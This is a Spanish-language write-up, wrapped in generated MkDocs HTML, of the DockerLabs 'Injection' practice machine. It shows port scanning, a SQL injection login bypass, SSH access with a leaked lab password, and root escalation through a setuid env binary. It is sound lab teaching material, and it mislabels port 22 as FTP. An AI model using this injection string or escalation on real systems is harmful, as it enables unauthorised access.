@@ -1,0 +1,574 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
+    
+    
+      
+        <title>Write Up Injection - Isaías Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.7e37652d.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#write-up-injection" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Isaías Writeups" class="md-header__button md-logo" aria-label="Isaías Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Isaías Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Write Up Injection
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Isaías Writeups" class="md-nav__button md-logo" aria-label="Isaías Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Isaías Writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Writeups
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Writeups
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../FirstHacking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    First Hacking
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Injection
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Trust/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Trust
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Obsession/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Obsession
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#configuracion-del-entorno" class="md-nav__link">
+    <span class="md-ellipsis">
+      Configuración del entorno
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reconocimiento" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reconocimiento
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#explotacion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Explotación
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#escalada-de-privilegios" class="md-nav__link">
+    <span class="md-ellipsis">
+      Escalada de privilegios
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lecciones-vistas" class="md-nav__link">
+    <span class="md-ellipsis">
+      Lecciones vistas
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="write-up-injection">Write Up Injection</h1>
+<p><strong>Dificultad:</strong> Super fácil<br>
+<strong>Enlace a dockerlabs:</strong> https://dockerlabs.es/</p>
+<h2 id="configuracion-del-entorno">Configuración del entorno</h2>
+<p>Primero de todo desplegamos la máquina mediante el script que viene al descargar la máquina</p>
+<pre><code>❯ sudo ./auto_deploy.sh injection.tar
+
+Estamos desplegando la máquina vulnerable, espere un momento.
+
+Máquina desplegada, su dirección IP es --&gt; 172.17.0.2
+
+Presiona Ctrl+C cuando termines con la máquina para eliminarla
+</code></pre>
+<p>Una vez desplegada, creamos la carpeta injection, nos metemos dentro y usamos la utilidad <em>mkt</em> que nos crea las carpetas <em>nmap</em>, <em>content</em>, <em>exploits</em> y <em>scripts</em>.</p>
+<pre><code>❯ mkdir injection-dockerlabs
+❯ cd injection-dockerlabs
+❯ mkt
+❯ ls -l
+drwxrwxr-x godack godack 4.0 KB Fri Aug 15 17:03:20 2025 content
+drwxrwxr-x godack godack 4.0 KB Fri Aug 15 17:03:20 2025 exploits
+drwxrwxr-x godack godack 4.0 KB Fri Aug 15 17:03:20 2025 nmap
+drwxrwxr-x godack godack 4.0 KB Fri Aug 15 17:03:20 2025 scripts
+</code></pre>
+<h2 id="reconocimiento">Reconocimiento</h2>
+<p>Lo primero que realizamos es un reconocimiento general con nmap sobre la máquina víctima, para obtener los puertos abiertos. </p>
+<pre><code>❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 64
+80/tcp open  http    syn-ack ttl 64
+</code></pre>
+<p>Una vez obtenemos los puertos abiertos, realizamos un escaneo mas exhaustivo mediante scripts de reconocimiento para obtener los servicios de cada puerto y la versión en la que corren</p>
+<pre><code>❯ extractPorts allPorts
+[*] Extracting information...
+
+   [*] IP Address: 172.17.0.2
+   [*] Open ports: 22,80
+
+[*] Ports copied to clipboard
+
+❯ nmap -sCV -p22,80 172.17.0.2 -oN targeted
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 17:09 CEST
+Nmap scan report for 172.17.0.2
+Host is up (0.000051s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)
+|_  256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-title: Iniciar Sesi\xC3\xB3n
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.31 seconds
+</code></pre>
+<p>De esta manera descubrimos que el servicio que está corriendo en el puerto 22 (puerto FTP) es el OpenSSH 8.9p1 y en el puerto 80 (puerto http) está corriendo un servicio web Apache httpd 2.4.52.</p>
+<h2 id="explotacion">Explotación</h2>
+<p>Como hemos visto que hay un servicio web corriendo en la máquina víctima procedemos a ver la web, añadiendo el dominio (en este caso no tiene y simplemente pondremos el nombre de la máquina) al archivo <em>/etc/hosts</em> de nuestra máquina virtual (es el archivo de configuración de DNS local).</p>
+<pre><code>❯ sudo vi /etc/hosts
+❯ cat /etc/hosts
+127.0.0.1   localhost
+127.0.1.1   kali
+
+172.17.0.2  injection
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</code></pre>
+<p>Una vez configurado el archivo <em>/etc/hosts</em> procedemos a acceder a la página web, y vemos que es un formulario de login.</p>
+<p><img alt="Web" src="../.sources/injection-login.png" /></p>
+<p>Probamos a introducir los parámetros básicos para comprobar si hay inyección SQL. Para ello hay que introducir la cadena <em>admin' OR '1' = '1'; --</em> en el apartado de usuario y cualquier cosa en password (en mi caso he puesto <em>hacked!</em>) para que deje enviar el formulario, y si todo va bien, podremos entrar siendo los administradores (si no va con el usuario admin se puede ir cambiando a root, administrator, y cosas parecidas, pero sin perder mucho el tiempo).</p>
+<pre><code>User: admin' OR '1' = '1'; --
+Password: hacked!
+</code></pre>
+<p>Y bingo! Estamos dentro y obtenemos las credenciales de el usuario Dylan</p>
+<pre><code>Bienvenido Dylan! Has insertado correctamente tu contraseña: KJSDFG789FGSDF78
+</code></pre>
+<p>Al haber obtenido esas credenciales, podemos probar a acceder mediante el puerto ssh también abierto.</p>
+<pre><code>ssh dylan@injection
+dylan@injection's password: (aquí ponemos el password)
+dylan@6b329dffcb35:~$ 
+</code></pre>
+<p>Y ya tenemos acceso a la máquina!</p>
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+<p>Para poder utilizar la consola de una manera mas cómoda podemos hacer el siguiente tratamiento de la terminal:</p>
+<pre><code>script /dev/null -c bash
+stty raw -echo; fg
+reset xterm
+export TERM=xterm
+</code></pre>
+<p>Ahora que tenemos una terminal buscamos archivos (a poder ser binarios) con usuario root y el flag <em>setuid</em> activo y encontramos los siguientes:</p>
+<pre><code>dylan@6b329dffcb35:/bin$ find / -perm -4000 -user root 2&gt;/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/env
+/usr/bin/chsh
+</code></pre>
+<p>Así que usamos el comando env de la siguiente forma y elevamos privilegios a root</p>
+<pre><code>dylan@6b329dffcb35:/bin$ ./env /bin/sh -p
+# whoami
+root
+# 
+</code></pre>
+<h2 id="lecciones-vistas">Lecciones vistas</h2>
+<ol>
+<li>Escaneos con <strong>nmap</strong></li>
+<li>Inyección SQL simple</li>
+<li>Busqueda de binarios con <em>setuid</em> activo</li>
+<li>Escalada de privilegios con <strong>env</strong></li>
+</ol>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.92b07e13.min.js"></script>
+      
+    
+  </body>
+</html>
